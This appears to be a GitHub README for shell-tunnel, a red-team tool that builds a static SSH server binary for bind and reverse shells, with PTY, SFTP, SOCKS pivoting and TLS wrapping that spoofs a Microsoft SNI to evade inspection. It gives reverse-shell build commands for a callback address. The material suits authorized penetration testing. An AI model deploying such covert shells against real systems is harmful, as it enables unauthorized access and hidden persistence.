# shell-tunnel

Static SSH server for bind and reverse shells with PTY and SFTP

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="docs/assets/cover-dark.svg">
  
</picture>

```sh
./build.sh reverse 10.10.14.5:4444
./build.sh listen 8888
```

I wanted a tiny way to get a good reverse shell and a pivot without juggling listeners and tunnel syntax by hand. shell-tunnel is that errand as one static binary: credentials and connection details are baked in at build time, the target runs it, and a plain `ssh` client gets a full PTY, SFTP file transfer and all three kinds of port forwarding. Optional TLS wrapping hides the SSH banner inside what looks like HTTPS. It assumes you have written authorization for the target. For authorized security testing only.

shell-tunnel is the preservation fork of [Ferdinor's undertow](https://github.com/Ferdinor) (2021), whose upstream repository is no longer public — same GPLv3, modernized and maintained: current dependencies (the 2021 `x/crypto` pin had known SSH vulnerabilities), CI on every commit, and tagged releases with six prebuilt binaries.

## What's in it

| Piece | Does |
|---|---|
| `reverse` | Binary dials home through egress firewalls and retries every 5 s until the listener answers; you SSH to the bind it sets up on your box (random port by default, `-b` pins it) |
| `listen` | Binary listens on the target; you SSH straight to it |
| PTY | openpty on Linux, ConPTY on Windows 10 17763+ — tab completion, job control, full-screen tools; terminal resizes follow your window, and bash-less targets fall back to `/bin/sh` |
| SFTP | Built-in subsystem on the same connection — `sftp -P 4444 svc@127.0.0.1` |
| Forwarding | Local (`-L`), remote (`-R`) and dynamic SOCKS (`-D`) through the stock ssh client; the session is the pivot |
| `--tls` | Wraps SSH in TLS with ALPN and a spoofed SNI (default `www.microsoft.com`) so the banner never crosses the wire in plaintext |
| `--nocli` | Bakes a flagless payload; with `--daemonize` it also backgrounds itself on launch (frees evil-winrm-style sessions) |

`./build.sh` cross-compiles Linux and Windows binaries with a fresh random password baked in (`-p` pins one, `-k` bakes an ED25519 authorized key instead), and writes a handler script for reverse mode that starts the listener and shows the password. Every status line starts with a bracketed tag — `[ok]`, `[!]`, `[x]`, `[i]` — so output stays meaningful piped or with `NO_COLOR` set.

When a callback lands, the listener numbers it (`Session 1: …`) and prints two commands. The first starts a ControlMaster — `ssh -fNM -S /tmp/shell-tunnel-<port>.sock …` with `UserKnownHostsFile=/dev/null`, `StrictHostKeyChecking=no`, `ServerAliveInterval=60`, `ServerAliveCountMax=10` and `ExitOnForwardFailure=yes` — so a dropped VPN only ends the session after ten straight minutes of silence — and the second opens the PTY over that socket. SFTP and `-L`/`-R`/`-D` forwards then share the one authenticated connection, and the per-run host key never touches `~/.ssh/known_hosts`. Dial-home also sends `keepalive@openssh.com` every 15 s so NAT idle timeouts don't eat a parked callback. Inside the session, ssh's escape keys work as always: `~^Z` backgrounds it, `~#` lists forwarded connections, `~.` closes it.

## Tested on

- 18 in-process integration tests run the real server on loopback (one, the shell fallback, is unix-only): password and pubkey auth (accept and reject), exec with exit status, PTY shell, SFTP round trip, direct-tcpip and remote forwarding, the rs-info channel, the full dial-home reverse flow and a late-listener retry — on every commit in CI and on the Windows build host
- Windows 11 · Go 1.27 — build host; gofmt, `go vet`, clean builds for all six targets
- ubuntu-24.04, windows-2022, macos-latest · CI builds amd64 and arm64 on every commit
- *Not* run: macOS at runtime — cross-compiled on every release, unsigned; first run needs `xattr -d com.apple.quarantine`

## Known issues

- The dial-home side uses `InsecureIgnoreHostKey`: a payload can't pin a host key it has never seen. Verify the callback out of band — the handler shows the connecting address and the rs-info line names the user and host.
- Only the initial dial retries. An established callback that drops later is not redialled; run the payload again.
- TLS wrapping presents a self-signed certificate generated at runtime. It hides the SSH banner from DPI; it does not authenticate the listener to the payload.
- Baked credentials live in the binary. Build per engagement, and keep the handler scripts to yourself — they print the password and are written `chmod 700` for a reason.
- Windows targets older than Windows 10 17763 have no ConPTY; use `-s ssh-shellhost.exe`, or append `cmd` to the ssh line for a non-PTY session.
- Nothing is signed. The Windows SmartScreen and macOS Gatekeeper warnings on first run are expected; `SHA256SUMS.txt` comes from the same release as the binaries it checks.

## Configuration

- `./build.sh <mode> <target> [options]` — see `./build.sh --help`; every build knob ends up as an ldflags variable (`RS_PASS`, `LHOST`, `TLS_SNI`, …), so the [Makefile](Makefile) works directly too
- `-V` / `--version` — print `shell-tunnel vX.Y.Z` and exit 0
- `NO_COLOR` — plain output from the build script and the binary

## License

[GPLv3](LICENSE), inherited from the upstream project; original copyright headers stay in every source file. For authorized security testing with explicit written permission only.

[Project page](https://real-fruit-snacks.github.io/shell-tunnel/) · [Changelog](CHANGELOG.md) · [Security](SECURITY.md)
